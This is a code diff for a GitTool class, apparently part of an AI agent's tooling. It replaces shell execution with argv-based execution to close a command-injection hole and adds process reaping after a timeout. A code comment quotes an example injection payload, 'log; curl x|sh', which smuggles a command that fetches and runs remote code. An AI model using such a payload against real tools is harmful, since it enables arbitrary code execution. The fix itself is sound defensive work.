@@ -30,19 +30,23 @@ class GitTool:
         cwd = params.get("cwd", ".")
         meta = ToolCallMetadata(tool_name="git")
 
-        subcommand = command.split()[0] if command.strip() else ""
+        # Validate the first token, then run via argv (no shell) so a payload
+        # like "log; curl x|sh" cannot escape — split()[0] == "log" would have
+        # passed the old check but the shell interpolated the whole string.
+        parts = command.split()
+        subcommand = parts[0] if parts else ""
         if subcommand not in READ_ONLY_COMMANDS:
             return ToolResult(success=False, output="", error=f"Git '{subcommand}' is not allowed (read-only commands only)", metadata=meta)
 
-        full_cmd = f"git {command}"
         try:
-            proc = await asyncio.create_subprocess_shell(
-                full_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=cwd,
+            proc = await asyncio.create_subprocess_exec(
+                "git", *parts, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=cwd,
             )
             try:
                 stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
             except asyncio.TimeoutError:
                 proc.kill()
+                await proc.wait()
                 return ToolResult(success=False, output="", error="Git command timed out", metadata=meta)
 
             output = stdout.decode(errors="ignore")
